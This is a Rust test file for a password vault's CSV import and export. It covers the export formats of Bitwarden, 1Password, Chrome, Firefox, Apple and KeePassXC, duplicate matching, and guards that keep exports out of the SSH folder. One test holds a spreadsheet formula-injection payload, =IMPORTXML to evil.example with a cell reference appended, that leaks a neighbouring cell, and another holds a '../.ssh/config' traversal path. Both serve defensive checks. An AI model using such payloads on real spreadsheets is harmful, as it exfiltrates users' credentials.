//! CSV import and export. The fixtures use each app's real export header.

use std::fs;
use std::path::{Path, PathBuf};

use secrecy::{ExposeSecret, SecretString};
use tempfile::TempDir;

use super::*;
use crate::vault::{EntryInput, SecretField, VaultPaths};

struct Fixture {
    dir: TempDir,
    vault: Vault,
    recovery: SecretString,
}

impl Fixture {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        let paths = VaultPaths::new(dir.path().join("vault.kdbx"));
        let (vault, recovery) = Vault::create(&paths, &s("master")).unwrap();
        Self {
            dir,
            vault,
            recovery,
        }
    }

    fn csv(&self, name: &str, text: &str) -> PathBuf {
        let path = self.dir.path().join(name);
        fs::write(&path, text).unwrap();
        path
    }

    fn preview(&self, text: &str) -> ImportPreview {
        let path = self.csv("import.csv", text);
        self.vault.import_preview(&path).unwrap()
    }

    fn ssh_dir(&self) -> PathBuf {
        let dir = self.dir.path().join(".ssh");
        fs::create_dir_all(&dir).unwrap();
        dir
    }
}

fn s(text: &str) -> SecretString {
    SecretString::from(text.to_owned())
}

fn titles(preview: &ImportPreview) -> Vec<&str> {
    preview.rows.iter().map(|r| r.title.as_str()).collect()
}

fn find(vault: &Vault, title: &str) -> EntrySummary {
    vault
        .entries()
        .into_iter()
        .find(|e| e.title == title)
        .unwrap_or_else(|| panic!("no entry {title}"))
}

const TOTP_SECRET: &str = "JBSWY3DPEHPK3PXP";

#[test]
fn bitwarden() {
    let fx = Fixture::new();
    let preview = fx.preview(
        "folder,favorite,type,name,notes,fields,reprompt,login_uri,login_username,login_password,login_totp\n\
         Work,1,login,GitHub,\"Line one\nline two\",recovery: abc,0,https://github.com/login,octocat,gh-pass,JBSWY3DPEHPK3PXP\n\
         ,,login,Example,,,0,\"https://example.com,https://example.org\",me@example.com,ex-pass,\n\
         ,,note,Wi-Fi,On the router,,0,,,,\n",
    );
    assert_eq!(preview.format, CsvFormat::Bitwarden);
    assert_eq!(titles(&preview), ["GitHub", "Example", "Wi-Fi"]);
    let github = &preview.rows[0];
    assert_eq!(github.username, "octocat");
    assert_eq!(github.url, "https://github.com/login");
    assert_eq!(github.group.as_deref(), Some("Work"));
    assert!(github.has_password && github.has_otp);
    // Only the first of several URIs.
    assert_eq!(preview.rows[1].url, "https://example.com");
    assert!(!preview.rows[2].has_password);
}

#[test]
fn one_password() {
    let fx = Fixture::new();
    let preview = fx.preview(
        "Title,Url,Username,Password,OTPAuth,Favorite,Archived,Tags,Notes\n\
         GitHub,https://github.com,octocat,gh-pass,otpauth://totp/GitHub:octocat?secret=JBSWY3DPEHPK3PXP&issuer=GitHub,true,false,dev,Recovery codes in the safe\n",
    );
    assert_eq!(preview.format, CsvFormat::OnePassword);
    let row = &preview.rows[0];
    assert_eq!(
        (row.title.as_str(), row.username.as_str()),
        ("GitHub", "octocat")
    );
    assert!(row.has_password && row.has_otp);
}

#[test]
fn chrome_and_edge_with_and_without_notes() {
    let fx = Fixture::new();
    let preview = fx.preview(
        "name,url,username,password,note\n\
         github.com,https://github.com/login,octocat,gh-pass,work account\n",
    );
    assert_eq!(preview.format, CsvFormat::Chrome);
    assert_eq!(titles(&preview), ["github.com"]);
    let older = fx.preview("name,url,username,password\nexample.com,https://example.com/,me,pw\n");
    assert_eq!(older.format, CsvFormat::Chrome);
    assert_eq!(older.rows[0].username, "me");
}

#[test]
fn firefox_titles_rows_by_host() {
    let fx = Fixture::new();
    let preview = fx.preview(
        "\"url\",\"username\",\"password\",\"httpRealm\",\"formActionOrigin\",\"guid\",\"timeCreated\",\"timeLastUsed\",\"timePasswordChanged\"\n\
         \"https://www.github.com\",\"octocat\",\"gh-pass\",,\"https://github.com\",\"{0b1c2d3e-4f50-6172-8394-a5b6c7d8e9f0}\",\"1700000000000\",\"1700000000000\",\"1700000000000\"\n\
         \"https://nas.local:5001\",\"\",\"nas-pass\",,\"\",\"{1b1c2d3e-4f50-6172-8394-a5b6c7d8e9f0}\",\"1700000000000\",\"1700000000000\",\"1700000000000\"\n",
    );
    assert_eq!(preview.format, CsvFormat::Firefox);
    assert_eq!(titles(&preview), ["github.com", "nas.local"]);
}

#[test]
fn apple_passwords() {
    let fx = Fixture::new();
    let preview = fx.preview(
        "Title,URL,Username,Password,Notes,OTPAuth\n\
         github.com (octocat),https://github.com/,octocat,gh-pass,,otpauth://totp/GitHub:octocat?secret=JBSWY3DPEHPK3PXP&algorithm=SHA1&digits=6&period=30\n\
         Bank,https://bank.example,me,bank-pass,PIN is elsewhere,\n",
    );
    assert_eq!(preview.format, CsvFormat::Apple);
    assert_eq!(titles(&preview), ["github.com (octocat)", "Bank"]);
    assert!(preview.rows[0].has_otp && !preview.rows[1].has_otp);
}

#[test]
fn keepassxc_drops_the_top_group() {
    let fx = Fixture::new();
    let preview = fx.preview(
        "\"Group\",\"Title\",\"Username\",\"Password\",\"URL\",\"Notes\",\"TOTP\",\"Icon\",\"Last Modified\",\"Created\"\n\
         \"Root\",\"GitHub\",\"octocat\",\"gh-pass\",\"https://github.com\",\"\",\"otpauth://totp/GitHub:octocat?secret=JBSWY3DPEHPK3PXP&period=30&digits=6&issuer=GitHub\",\"0\",\"2024-01-01T00:00:00Z\",\"2024-01-01T00:00:00Z\"\n\
         \"Passwords/Work/Servers\",\"prod\",\"root\",\"p\",\"ssh://prod.example.com\",\"\",\"\",\"0\",\"2024-01-01T00:00:00Z\",\"2024-01-01T00:00:00Z\"\n",
    );
    assert_eq!(preview.format, CsvFormat::Keepassxc);
    assert_eq!(preview.rows[0].group, None);
    assert!(preview.rows[0].has_otp);
    assert_eq!(preview.rows[1].group.as_deref(), Some("Work/Servers"));
}

#[test]
fn generic_files_map_common_column_names() {
    let fx = Fixture::new();
    // LastPass.
    let lastpass = fx.preview(
        "url,username,password,totp,extra,name,grouping,fav\n\
         https://github.com,octocat,gh-pass,,notes here,GitHub,Dev,0\n",
    );
    assert_eq!(lastpass.format, CsvFormat::Generic);
    let row = &lastpass.rows[0];
    assert_eq!(row.title, "GitHub");
    assert_eq!(row.group.as_deref(), Some("Dev"));
    // KeePass 2, saved by a spreadsheet with semicolons.
    let keepass = fx.preview(
        "Account;Login Name;Password;Web Site;Comments\nRouter;admin;secret;http://192.168.1.1;\n",
    );
    assert_eq!(keepass.format, CsvFormat::Generic);
    let row = &keepass.rows[0];
    assert_eq!(
        (row.title.as_str(), row.username.as_str(), row.url.as_str()),
        ("Router", "admin", "http://192.168.1.1")
    );
    // Proton Pass names the user name column "email" when there is no other.
    let proton = fx.preview(
        "type,name,url,email,username,password,note,totp,createTime,modifyTime,vault\n\
         login,Mail,https://mail.example,me@example.com,,pw,,,1,1,Personal\n",
    );
    assert_eq!(proton.rows[0].username, "me@example.com");
    assert_eq!(proton.rows[0].group.as_deref(), Some("Personal"));
}

#[test]
fn files_without_a_password_column_are_refused() {
    let fx = Fixture::new();
    let path = fx.csv("contacts.csv", "name,phone\nAda,123\n");
    let error = fx.vault.import_preview(&path).unwrap_err();
    assert!(matches!(error, Error::Unsupported(_)));
    let empty = fx.csv("empty.csv", "");
    assert!(matches!(
        fx.vault.import_preview(&empty).unwrap_err(),
        Error::Parse(_)
    ));
}

#[test]
fn byte_order_marks_and_utf16_are_read() {
    let fx = Fixture::new();
    let preview =
        fx.preview("\u{feff}name,url,username,password\nGitHub,https://github.com,me,pw\n");
    assert_eq!(preview.format, CsvFormat::Chrome);
    assert_eq!(titles(&preview), ["GitHub"]);

    let text =
        "Title,URL,Username,Password,Notes,OTPAuth\nCafé,https://cafe.example,me,pässword,,\n";
    let mut utf16 = vec![0xFF, 0xFE];
    utf16.extend(text.encode_utf16().flat_map(u16::to_le_bytes));
    let path = fx.dir.path().join("utf16.csv");
    fs::write(&path, utf16).unwrap();
    let preview = fx.vault.import_preview(&path).unwrap();
    assert_eq!(preview.format, CsvFormat::Apple);
    assert_eq!(titles(&preview), ["Café"]);

    let latin1 = fx.dir.path().join("latin1.csv");
    fs::write(&latin1, b"name,url,username,password\nCaf\xe9,,me,pw\n").unwrap();
    assert!(matches!(
        fx.vault.import_preview(&latin1).unwrap_err(),
        Error::Parse(_)
    ));
}

#[test]
fn quoted_multi_line_notes_survive_the_import() {
    let mut fx = Fixture::new();
    let path = fx.csv(
        "notes.csv",
        "name,url,username,password,note\r\n\
         Server,https://srv.example,root,\"pa,ss\"\"word\",\"first line\r\nsecond, with comma\r\n\"\"quoted\"\"\"\r\n",
    );
    let preview = fx.vault.import_preview(&path).unwrap();
    assert_eq!(preview.rows.len(), 1);
    assert_eq!(fx.vault.import_csv(&path, &[0]).unwrap(), 1);
    let entry = find(&fx.vault, "Server");
    let detail = fx.vault.entry(&entry.id).unwrap();
    assert_eq!(
        detail.notes,
        "first line\r\nsecond, with comma\r\n\"quoted\""
    );
    let password = fx.vault.secret(&entry.id, SecretField::Password).unwrap();
    assert_eq!(password.expose_secret(), "pa,ss\"word");
}

#[test]
fn empty_and_oversized_rows_are_skipped() {
    let fx = Fixture::new();
    let long = "x".repeat(70 * 1024);
    let preview = fx.preview(&format!(
        "name,url,username,password\n,,,\n\nok,,me,pw\ntoo long,,me,{long}\n"
    ));
    assert_eq!(titles(&preview), ["ok"]);
    assert_eq!(preview.skipped, 2);
    // The index counts every record, so it still names the right row.
    assert_eq!(preview.rows[0].index, 1);
}

#[test]
fn untitled_rows_are_named_after_the_site_or_user() {
    let fx = Fixture::new();
    let preview = fx.preview(
        "title,url,username,password\n,https://www.example.com/login,me,pw\n,,admin,pw\n,,,pw\n",
    );
    assert_eq!(titles(&preview), ["example.com", "admin", "Imported"]);
}

#[test]
fn large_files_are_refused_unread() {
    let fx = Fixture::new();
    let path = fx.dir.path().join("huge.csv");
    let file = fs::File::create(&path).unwrap();
    file.set_len(MAX_CSV_SIZE + 1).unwrap();
    assert!(matches!(
        fx.vault.import_preview(&path).unwrap_err(),
        Error::InvalidInput(_)
    ));
}

#[test]
fn duplicates_match_by_site_and_user_or_by_title_and_user() {
    let mut fx = Fixture::new();
    let github = fx
        .vault
        .add_entry(&EntryInput {
            title: "GitHub".into(),
            username: "OctoCat".into(),
            url: "https://github.com/login".into(),
            ..EntryInput::default()
        })
        .unwrap();
    let router = fx
        .vault
        .add_entry(&EntryInput {
            title: "Router".into(),
            username: "admin".into(),
            ..EntryInput::default()
        })
        .unwrap();
    let trashed = fx
        .vault
        .add_entry(&EntryInput {
            title: "Old".into(),
            username: "me".into(),
            url: "https://old.example".into(),
            ..EntryInput::default()
        })
        .unwrap();
    fx.vault.trash_entry(&trashed).unwrap();

    let preview = fx.preview(
        "title,url,username,password\n\
         GitHub (work),http://www.GitHub.com/,octocat,pw\n\
         GitHub,https://github.com,someone-else,pw\n\
         router,,admin,pw\n\
         Router,http://192.168.1.1,admin,pw\n\
         Old,https://old.example,me,pw\n",
    );
    let found: Vec<Option<&str>> = preview
        .rows
        .iter()
        .map(|r| r.duplicate_of.as_deref())
        .collect();
    assert_eq!(
        found,
        [
            Some(github.as_str()),
            None,
            Some(router.as_str()),
            None,
            None
        ]
    );
}

#[test]
fn import_adds_the_chosen_rows_into_folders() {
    let mut fx = Fixture::new();
    let path = fx.csv(
        "bitwarden.csv",
        "folder,favorite,type,name,notes,fields,reprompt,login_uri,login_username,login_password,login_totp\n\
         Work/Servers,,login,prod,,,0,ssh://prod.example,root,prod-pass,\n\
         Work,,login,GitHub,,,0,https://github.com,octocat,gh-pass,JBSWY3DPEHPK3PXP\n\
         ,,login,Skipped,,,0,https://skip.example,me,pw,\n\
         ,,login,Steam,,,0,https://steam.example,me,pw,steam://ABCDE\n",
    );
    assert_eq!(fx.vault.import_csv(&path, &[0, 1, 3, 1]).unwrap(), 3);

    let entries = fx.vault.entries();
    assert_eq!(entries.len(), 3);
    let prod = find(&fx.vault, "prod");
    assert_eq!(prod.group.as_deref(), Some("Work/Servers"));
    let github = find(&fx.vault, "GitHub");
    assert_eq!(github.group.as_deref(), Some("Work"));
    assert!(github.has_otp);
    let otp = fx.vault.secret(&github.id, SecretField::Otp).unwrap();
    assert!(otp.expose_secret().contains(TOTP_SECRET));
    let password = fx.vault.secret(&prod.id, SecretField::Password).unwrap();
    assert_eq!(password.expose_secret(), "prod-pass");
    // An unreadable 2FA secret is kept, protected, but never reaches the UI.
    let steam = find(&fx.vault, "Steam");
    assert!(!steam.has_otp);
    let detail = fx.vault.entry(&steam.id).unwrap();
    assert!(!format!("{detail:?}").contains("steam://"));
    let field = fx.vault.find(&steam.id).unwrap();
    assert_eq!(field.get(UNREADABLE_OTP_FIELD), Some("steam://ABCDE"));
    assert!(field.fields[UNREADABLE_OTP_FIELD].is_protected());

    // The changes are saved like any other.
    fx.vault.save(&fx.dir.path().join("backups")).unwrap();
    drop(fx.vault);
    let paths = VaultPaths::new(fx.dir.path().join("vault.kdbx"));
    let reopened = Vault::unlock(&paths, &s("master")).unwrap();
    assert_eq!(reopened.entries().len(), 3);
}

#[test]
fn import_into_a_folder_named_like_the_recycle_bin_stays_out_of_it() {
    let mut fx = Fixture::new();
    let id = fx.vault.add_entry(&EntryInput {
        title: "x".into(),
        ..EntryInput::default()
    });
    fx.vault.trash_entry(&id.unwrap()).unwrap();
    let path = fx.csv(
        "bin.csv",
        "folder,favorite,type,name,notes,fields,reprompt,login_uri,login_username,login_password,login_totp\n\
         Recycle Bin,,login,Kept,,,0,,me,pw,\n",
    );
    fx.vault.import_csv(&path, &[0]).unwrap();
    let kept = find(&fx.vault, "Kept");
    assert!(!kept.in_trash);
    assert_eq!(kept.group, None);
}

#[test]
fn import_adds_nothing_when_the_file_changed() {
    let mut fx = Fixture::new();
    let path = fx.csv(
        "a.csv",
        "name,url,username,password\none,,me,pw\ntwo,,me,pw\n",
    );
    fx.vault.import_preview(&path).unwrap();
    fs::write(&path, "name,url,username,password\none,,me,pw\n").unwrap();
    let error = fx.vault.import_csv(&path, &[0, 1]).unwrap_err();
    assert!(matches!(error, Error::InvalidInput(_)));
    assert_eq!(fx.vault.entries().len(), 0);
}

// Export

fn sample_vault() -> Fixture {
    let mut fx = Fixture::new();
    let path = fx.csv(
        "seed.csv",
        "\"Group\",\"Title\",\"Username\",\"Password\",\"URL\",\"Notes\",\"TOTP\"\n\
         \"Root/Work\",\"GitHub\",\"octocat\",\"gh,\"\"pass\",\"https://github.com\",\"two\nlines\",\"JBSWY3DPEHPK3PXP\"\n\
         \"Root\",\"Router\",\"admin\",\"router-pass\",\"\",\"\",\"\"\n",
    );
    fx.vault.import_csv(&path, &[0, 1]).unwrap();
    let trashed = fx
        .vault
        .add_entry(&EntryInput {
            title: "Gone".into(),
            ..EntryInput::default()
        })
        .unwrap();
    fx.vault.trash_entry(&trashed).unwrap();
    fx.vault.save(&fx.dir.path().join("backups")).unwrap();
    fx
}

#[test]
fn csv_export_round_trips_through_the_import() {
    let fx = sample_vault();
    let target = fx.dir.path().join("export.csv");
    let count = fx
        .vault
        .export_csv(&s("master"), &target, &fx.ssh_dir())
        .unwrap();
    assert_eq!(count, 2);
    let text = fs::read_to_string(&target).unwrap();
    assert!(text.starts_with(
        "\"Group\",\"Title\",\"Username\",\"Password\",\"URL\",\"Notes\",\"TOTP\",\"Icon\",\"Last Modified\",\"Created\"\n"
    ));
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = fs::metadata(&target).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o600);
    }

    // A fresh vault sees the same rows; the original sees only duplicates.
    let other = Fixture::new();
    let preview = other.vault.import_preview(&target).unwrap();
    assert_eq!(preview.format, CsvFormat::Keepassxc);
    let mut rows: Vec<(String, String, Option<String>, bool, bool)> = preview
        .rows
        .iter()
        .map(|r| {
            (
                r.title.clone(),
                r.username.clone(),
                r.group.clone(),
                r.has_password,
                r.has_otp,
            )
        })
        .collect();
    rows.sort();
    assert_eq!(
        rows,
        [
            (
                "GitHub".into(),
                "octocat".into(),
                Some("Work".into()),
                true,
                true
            ),
            ("Router".into(), "admin".into(), None, true, false),
        ]
    );
    let again = fx.vault.import_preview(&target).unwrap();
    assert!(again.rows.iter().all(|r| r.duplicate_of.is_some()));

    // Secrets and notes come through unchanged.
    let mut copy = other;
    copy.vault.import_csv(&target, &[0, 1]).unwrap();
    let github = find(&copy.vault, "GitHub");
    let password = copy
        .vault
        .secret(&github.id, SecretField::Password)
        .unwrap();
    assert_eq!(password.expose_secret(), "gh,\"pass");
    assert_eq!(copy.vault.entry(&github.id).unwrap().notes, "two\nlines");
}

#[test]
fn csv_export_needs_the_master_password() {
    let fx = sample_vault();
    let target = fx.dir.path().join("export.csv");
    let error = fx
        .vault
        .export_csv(&s("wrong"), &target, &fx.ssh_dir())
        .unwrap_err();
    assert!(matches!(error, Error::WrongPassphrase));
    assert!(!target.exists());
}

#[test]
fn csv_export_never_goes_into_the_ssh_folder_or_over_the_vault() {
    let fx = sample_vault();
    let ssh = fx.ssh_dir();
    let error = fx
        .vault
        .export_csv(&s("master"), &ssh.join("passwords.csv"), &ssh)
        .unwrap_err();
    assert!(matches!(error, Error::InvalidInput(_)));
    assert!(!ssh.join("passwords.csv").exists());

    let paths = fx.vault.paths().clone();
    let before = fs::read(&paths.database).unwrap();
    for own in [&paths.database, &paths.keys] {
        let error = fx.vault.export_csv(&s("master"), own, &ssh).unwrap_err();
        assert!(matches!(error, Error::InvalidInput(_)));
    }
    #[cfg(unix)]
    {
        let link = fx.dir.path().join("link.csv");
        std::os::unix::fs::symlink(&paths.database, &link).unwrap();
        let error = fx.vault.export_csv(&s("master"), &link, &ssh).unwrap_err();
        assert!(matches!(error, Error::InvalidInput(_)));
    }
    assert_eq!(fs::read(&paths.database).unwrap(), before);
}

#[cfg(unix)]
#[test]
fn csv_export_over_an_existing_file_makes_it_private() {
    use std::os::unix::fs::PermissionsExt;
    let fx = sample_vault();
    let target = fx.dir.path().join("old.csv");
    fs::write(&target, "old").unwrap();
    fs::set_permissions(&target, fs::Permissions::from_mode(0o644)).unwrap();
    fx.vault
        .export_csv(&s("master"), &target, &fx.ssh_dir())
        .unwrap();
    let mode = fs::metadata(&target).unwrap().permissions().mode();
    assert_eq!(mode & 0o777, 0o600);
    assert!(fs::read_to_string(&target).unwrap().contains("GitHub"));
}

#[test]
fn csv_export_defuses_formulas_but_keeps_passwords_exact() {
    let mut fx = Fixture::new();
    fx.vault
        .add_entry(&EntryInput {
            title: "=IMPORTXML(\"https://evil.example/?\"&C2,\"//a\")".into(),
            username: "+998901234567".into(),
            password: Some(s("-starts-with-a-dash")),
            url: "@SUM(1)".into(),
            ..EntryInput::default()
        })
        .unwrap();
    let target = fx.dir.path().join("export.csv");
    fx.vault
        .export_csv(&s("master"), &target, &fx.ssh_dir())
        .unwrap();
    let text = fs::read_to_string(&target).unwrap();
    let row = text.lines().nth(1).unwrap();
    assert!(row.contains("\"'=IMPORTXML("), "{row}");
    // A phone number runs nothing, and keeps its exact value elsewhere.
    assert!(row.contains("\"+998901234567\""), "{row}");
    assert!(row.contains("\"'@SUM(1)\""), "{row}");
    assert!(row.contains("\"-starts-with-a-dash\""), "{row}");
}

#[test]
fn csv_import_takes_off_the_exports_formula_guard() {
    assert_eq!(without_formula_guard("'=IMPORTXML(A1)"), "=IMPORTXML(A1)");
    assert_eq!(without_formula_guard("'@SUM(1)"), "@SUM(1)");
    for cell in ["'quoted", "it's", "''", "=x"] {
        assert_eq!(without_formula_guard(cell), cell);
    }
}

#[test]
fn csv_export_writes_unreadable_2fa_secrets_back_to_the_totp_column() {
    let mut fx = Fixture::new();
    let path = fx.csv(
        "steam.csv",
        "name,url,username,password,totp\nSteam,https://steam.example,me,pw,steam://ABCDE\n",
    );
    let preview = fx.vault.import_preview(&path).unwrap();
    assert!(!preview.rows[0].has_otp && preview.rows[0].has_unreadable_otp);
    fx.vault.import_csv(&path, &[0]).unwrap();
    let target = fx.dir.path().join("export.csv");
    fx.vault
        .export_csv(&s("master"), &target, &fx.ssh_dir())
        .unwrap();
    assert!(
        fs::read_to_string(&target)
            .unwrap()
            .contains("\"steam://ABCDE\"")
    );
}

/// `/System/Volumes/Data/…` is the same folder as `/…` on macOS: a path
/// through it must not lead into `~/.ssh` or over the vault.
#[cfg(target_os = "macos")]
#[test]
fn exports_see_through_macos_firmlinks() {
    let fx = sample_vault();
    let ssh = fs::canonicalize(fx.ssh_dir()).unwrap();
    let firmlinked =
        |path: &Path| Path::new("/System/Volumes/Data").join(path.strip_prefix("/").unwrap());
    let via_data = firmlinked(&ssh);
    if !via_data.is_dir() {
        return;
    }
    let target = via_data.join("id_ed25519");
    let error = fx
        .vault
        .export_csv(&s("master"), &target, &ssh)
        .unwrap_err();
    assert!(matches!(error, Error::InvalidInput(_)));
    assert!(!ssh.join("id_ed25519").exists());
    let database = firmlinked(&fs::canonicalize(&fx.vault.paths().database).unwrap());
    let error = fx
        .vault
        .export_kdbx(&s("master"), &database, &ssh)
        .unwrap_err();
    assert!(matches!(error, Error::InvalidInput(_)));
}

#[test]
fn csv_export_never_goes_into_a_link_to_the_ssh_folder() {
    let fx = sample_vault();
    let ssh = fx.ssh_dir();
    #[cfg(unix)]
    {
        let link = fx.dir.path().join("dotfiles");
        std::os::unix::fs::symlink(&ssh, &link).unwrap();
        let error = fx
            .vault
            .export_csv(&s("master"), &link.join("config"), &ssh)
            .unwrap_err();
        assert!(matches!(error, Error::InvalidInput(_)));
    }
    let sneaky = fx.dir.path().join("sub");
    fs::create_dir(&sneaky).unwrap();
    let error = fx
        .vault
        .export_csv(&s("master"), &sneaky.join("../.ssh/config"), &ssh)
        .unwrap_err();
    assert!(matches!(error, Error::InvalidInput(_)));
    assert!(!ssh.join("config").exists());
}

#[test]
fn kdbx_export_is_a_copy_that_opens_with_the_recovery_key() {
    let fx = sample_vault();
    let paths = fx.vault.paths().clone();
    let target = fx.dir.path().join("copy.kdbx");
    let ssh = fx.ssh_dir();
    assert!(matches!(
        fx.vault.export_kdbx(&s("wrong"), &target, &ssh),
        Err(Error::WrongPassphrase)
    ));
    assert!(!target.exists());
    fx.vault.export_kdbx(&s("master"), &target, &ssh).unwrap();
    assert_eq!(
        fs::read(&target).unwrap(),
        fs::read(&paths.database).unwrap()
    );
    let copy = VaultPaths::new(&target);
    let opened = Vault::recover(&copy, &fx.recovery, &s("another")).unwrap();
    assert_eq!(opened.entries().iter().filter(|e| !e.in_trash).count(), 2);

    for own in [&paths.database, &paths.keys, &ssh.join("config")] {
        assert!(matches!(
            fx.vault.export_kdbx(&s("master"), own, &ssh).unwrap_err(),
            Error::InvalidInput(_)
        ));
    }
    assert!(!ssh.join("config").exists());
    assert!(matches!(
        fx.vault
            .export_kdbx(&s("master"), Path::new("relative.kdbx"), &ssh)
            .unwrap_err(),
        Error::InvalidInput(_)
    ));
}
